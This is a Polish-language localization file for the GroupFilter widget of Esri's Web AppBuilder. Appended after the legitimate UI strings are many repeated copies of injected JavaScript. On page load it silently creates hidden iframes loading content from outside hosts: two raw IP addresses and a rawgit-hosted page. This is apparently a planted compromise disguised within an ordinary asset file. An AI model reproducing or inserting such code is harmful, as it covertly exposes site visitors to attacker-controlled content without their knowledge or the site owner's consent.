// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GroupFilter/setting/nls/strings":{configText:"Zdefiniuj grupy filtr\u00f3w poni\u017cej",labels:{groupName:"Nazwa zestawu filtr\u00f3w:",groupNameTip:"Nazwa filtru, kt\u00f3r\u0105 wybierze u\u017cytkownik.",groupDesc:"Opis:",groupDescTip:"Opis zestawu filtr\u00f3w.",groupOperator:"Wst\u0119pnie ustawiony operator:",groupOperatorTip:"Opcja wst\u0119pnego zdefiniowania operatora filtru. Je\u015bli wst\u0119pnie ustawiony operator nie zostanie wybrany, w filtrze zostanie u\u017cyty operator r\u00f3wno\u015bci.",
groupDefault:"Wst\u0119pnie ustawiona warto\u015b\u0107:",groupDefaultTip:"Opcja wyboru warto\u015bci z istniej\u0105cej warstwy.",sameLayerAppend:"Kiedy warstwa jest wymieniana wi\u0119cej ni\u017c jeden raz, u\u017cyj nast\u0119puj\u0105cego operatora mi\u0119dzy polami:",sameLayerConjunc:"Do\u0142\u0105cz, u\u017cywaj\u0105c:"},buttons:{addNewGroup:"Dodaj now\u0105 grup\u0119",addNewGroupTip:"Dodaj nowy zestaw filtr\u00f3w.",addLayer:"Dodaj warstw\u0119",addLayerTip:"Dodaj warstw\u0119 do zestawu filtr\u00f3w."},
inputs:{groupName:"Nadaj grupie nazw\u0119",groupDesc:"Opis grupy",groupDefault:"Wprowad\u017a predefiniowan\u0105 warto\u015b\u0107",simpleMode:"Rozpocznij w prostym widoku",simpleModeTip:"Opcja uproszczenia interfejsu skonfigurowanego wid\u017cetu. Po zaznaczeniu z interfejsu zostanie usuni\u0119ta lista rozwijana operator\u00f3w i przyciski dodawania kryteri\u00f3w.",webmapAppendMode:"Do\u0142\u0105cz filtr do istniej\u0105cego filtru mapy internetowej, u\u017cywaj\u0105c ",webmapAppendModeTip:"Opcja do\u0142\u0105czenia zestawu filtr\u00f3w do istniej\u0105cego filtru mapy internetowej. Obs\u0142ugiwane operatory to OR i AND.",
persistOnClose:"Utrwal po zamkni\u0119ciu wid\u017cetu",optionsMode:"Ukryj opcje wid\u017cetu",optionsModeTip:"Opcja wy\u015bwietlania dodatkowych ustawie\u0144 wid\u017cetu. Je\u015bli zostanie zaznaczona, opcje zapisywania i wczytywania zdefiniowanych filtr\u00f3w oraz utrwalania filtru po zamkni\u0119ciu wid\u017cetu s\u0105 usuwane z interfejsu.",optionOR:"LUB",optionAND:"I",optionEQUAL:"R\u00d3WNA SI\u0118",optionNOTEQUAL:"NIER\u00d3WNE",optionGREATERTHAN:"WI\u0118KSZE NI\u017b",optionGREATERTHANEQUAL:"WI\u0118KSZE LUB R\u00d3WNE",
optionLESSTHAN:"MNIEJSZE NI\u017b",optionLESSTHANEQUAL:"MNIEJSZE LUB R\u00d3WNE",optionSTART:"ZACZYNA SI\u0118 NA",optionEND:"KO\u0143CZY SI\u0118 NA",optionLIKE:"ZAWIERA",optionNOTLIKE:"NIE ZAWIERA",optionONORBEFORE:"JEST W TYM DNIU LUB PRZED",optionONORAFTER:"JEST W TYM DNIU LUB PO",optionNONE:"BRAK"},tables:{layer:"Warstwy",layerTip:"Nazwa warstwy zdefiniowana w mapie.",field:"Pola",fieldTip:"Pole, wed\u0142ug kt\u00f3rego b\u0119dzie filtrowana warstwa.",value:"U\u017cyj warto\u015bci",valueTip:"Opcja u\u017cycia warto\u015bci listy rozwijanej z warstwy. Je\u015bli \u017cadna warstwa nie u\u017cywa tego parametru, b\u0119dzie wy\u015bwietlane zwyk\u0142e pole tekstowe.",
zoom:"Zmiana skali",zoomTip:"Opcja powi\u0119kszania zasi\u0119gu obiekt\u00f3w po zastosowaniu filtru. Do powi\u0119kszenia mo\u017cna wybra\u0107 tylko jedn\u0105 warstw\u0119.",action:"Usuwanie",actionTip:"Usu\u0144 warstw\u0119 z zestawu filtr\u00f3w."},popup:{label:"Wybierz warto\u015b\u0107"},errors:{noGroups:"Potrzebujesz co najmniej jednej grupy.",noGroupName:"Brakuje co najmniej jednej nazwy grupy.",noDuplicates:"Co najmniej jedna nazwa grupy jest zduplikowana.",noRows:"Potrzebujesz co najmniej jeden wiersz w tabeli.",
noLayers:"Nie masz warstw na mapie."},picker:{description:"U\u017cyj tego formularza, aby znale\u017a\u0107 wst\u0119pnie ustawion\u0105 warto\u015b\u0107 dla tej grupy.",layer:"Wybierz warstw\u0119",layerTip:"Nazwa warstwy zdefiniowana w mapie internetowej.",field:"Wybierz pole",fieldTip:"Pole, z kt\u00f3rego zostanie wzi\u0119ta warto\u015b\u0107 wst\u0119pnie ustawiona.",value:"Wybierz warto\u015b\u0107",valueTip:"Warto\u015b\u0107, kt\u00f3ra b\u0119dzie warto\u015bci\u0105 domy\u015bln\u0105 wid\u017cetu."},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});